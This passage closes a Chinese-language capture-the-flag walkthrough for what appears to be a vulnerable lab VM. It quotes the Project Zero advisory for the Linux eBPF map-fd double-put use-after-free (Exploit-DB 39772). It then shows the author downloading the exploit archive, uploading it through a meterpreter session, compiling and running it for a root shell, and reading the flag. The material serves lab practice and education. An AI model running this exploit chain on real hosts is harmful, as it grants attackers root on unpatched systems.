Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escal | linux/local/47169.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                | linux/local/41760.txt
------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

居然还有那么多利用方法？

这个地方有一点点痛苦 传入多个c文件编译都失败了 所以 这里

我参考了一下下别人的建议 在这里使用了一下这份漏洞

```bash
cat `locate linux/local/39772.txt`
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=808

In Linux >=4.4, when the CONFIG_BPF_SYSCALL config option is set and the
kernel.unprivileged_bpf_disabled sysctl is not explicitly set to 1 at runtime,
unprivileged code can use the bpf() syscall to load eBPF socket filter programs.
These conditions are fulfilled in Ubuntu 16.04.

When an eBPF program is loaded using bpf(BPF_PROG_LOAD, ...), the first
function that touches the supplied eBPF instructions is
replace_map_fd_with_map_ptr(), which looks for instructions that reference eBPF
map file descriptors and looks up pointers for the corresponding map files.
This is done as follows:

	/* look for pseudo eBPF instructions that access map FDs and
	 * replace them with actual map pointers
	 */
	static int replace_map_fd_with_map_ptr(struct verifier_env *env)
	{
		struct bpf_insn *insn = env->prog->insnsi;
		int insn_cnt = env->prog->len;
		int i, j;

		for (i = 0; i < insn_cnt; i++, insn++) {
			[checks for bad instructions]

			if (insn[0].code == (BPF_LD | BPF_IMM | BPF_DW)) {
				struct bpf_map *map;
				struct fd f;

				[checks for bad instructions]

				f = fdget(insn->imm);
				map = __bpf_map_get(f);
				if (IS_ERR(map)) {
					verbose("fd %d is not pointing to valid bpf_map\n",
						insn->imm);
					fdput(f);
					return PTR_ERR(map);
				}

				[...]
			}
		}
		[...]
	}


__bpf_map_get contains the following code:

/* if error is returned, fd is released.
 * On success caller should complete fd access with matching fdput()
 */
struct bpf_map *__bpf_map_get(struct fd f)
{
	if (!f.file)
		return ERR_PTR(-EBADF);
	if (f.file->f_op != &bpf_map_fops) {
		fdput(f);
		return ERR_PTR(-EINVAL);
	}

	return f.file->private_data;
}

The problem is that when the caller supplies a file descriptor number referring
to a struct file that is not an eBPF map, both __bpf_map_get() and
replace_map_fd_with_map_ptr() will call fdput() on the struct fd. If
__fget_light() detected that the file descriptor table is shared with another
task and therefore the FDPUT_FPUT flag is set in the struct fd, this will cause
the reference count of the struct file to be over-decremented, allowing an
attacker to create a use-after-free situation where a struct file is freed
although there are still references to it.

A simple proof of concept that causes oopses/crashes on a kernel compiled with
memory debugging options is attached as crasher.tar.


One way to exploit this issue is to create a writable file descriptor, start a
write operation on it, wait for the kernel to verify the file's writability,
then free the writable file and open a readonly file that is allocated in the
same place before the kernel writes into the freed file, allowing an attacker
to write data to a readonly file. By e.g. writing to /etc/crontab, root
privileges can then be obtained.

There are two problems with this approach:

The attacker should ideally be able to determine whether a newly allocated
struct file is located at the same address as the previously freed one. Linux
provides a syscall that performs exactly this comparison for the caller:
kcmp(getpid(), getpid(), KCMP_FILE, uaf_fd, new_fd).

In order to make exploitation more reliable, the attacker should be able to
pause code execution in the kernel between the writability check of the target
file and the actual write operation. This can be done by abusing the writev()
syscall and FUSE: The attacker mounts a FUSE filesystem that artificially delays
read accesses, then mmap()s a file containing a struct iovec from that FUSE
filesystem and passes the result of mmap() to writev(). (Another way to do this
would be to use the userfaultfd() syscall.)

writev() calls do_writev(), which looks up the struct file * corresponding to
the file descriptor number and then calls vfs_writev(). vfs_writev() verifies
that the target file is writable, then calls do_readv_writev(), which first
copies the struct iovec from userspace using import_iovec(), then performs the
rest of the write operation. Because import_iovec() performs a userspace memory
access, it may have to wait for pages to be faulted in - and in this case, it
has to wait for the attacker-owned FUSE filesystem to resolve the pagefault,
allowing the attacker to suspend code execution in the kernel at that point
arbitrarily.

An exploit that puts all this together is in exploit.tar. Usage:

user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
user@host:~/ebpf_mapfd_doubleput$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@host:~/ebpf_mapfd_doubleput# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)

This exploit was tested on a Ubuntu 16.04 Desktop system.

Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7


Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552
Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
```
# ROOT! 绝对的神
接下来我们只需要给他把文件下载下来 传过去运行 就可以直接pwn and  get root了

这里就可以很方便的使用上我们meterpreter的upload功能

```
#为了防止看不懂 于是添加了准备工作
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
unzip 39772.zip
cd 39772
tar -xf exploit.tar
mv *exploit pwn
tar -cf pwn.tar pwn
#开始利用

meterpreter > upload ~/pwn/pwn.tar
[*] uploading  : /PATH/pwn.tar -> pwn.tar
[*] Uploaded -1.00 B of 11.50 KiB (-0.01%): /PATH/pwn.tar -> pwn.tar
[*] uploaded   : /PATH/pwn.tar -> pwn.tar
meterpreter > ls
Listing: /var/www/html/pwn
==========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  11776  fil   2020-11-29 01:16:55 +0800  pwn.tar

meterpreter > shell
Process 3115 created.
Channel 9 created.

ls 
pwn.tar

tar -xf pwn.tar

ls
pwn
pwn.tar

cd pwn

ls
compile.sh
doubleput.c
hello.c
suidhelper.c

./compile.sh
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^

./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...


id
uid=0(root) gid=0(root) groups=0(root),33(www-data)

cd
bash: line 2: cd: HOME not set

cd /root

ls
the-flag.txt


cat the-flag.txt
 __        __   _ _   ____                   _ _ _ _ 
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
                                                     

Congratulations are in order.  :-)

I hope you've enjoyed this challenge as I enjoyed making it.

If there are any ways that I can improve these little challenges,
please let me know.

As per usual, comments and complaints can be sent via Twitter to @DCAU7

Have a great day!!!!

```

OK.success.

---

---

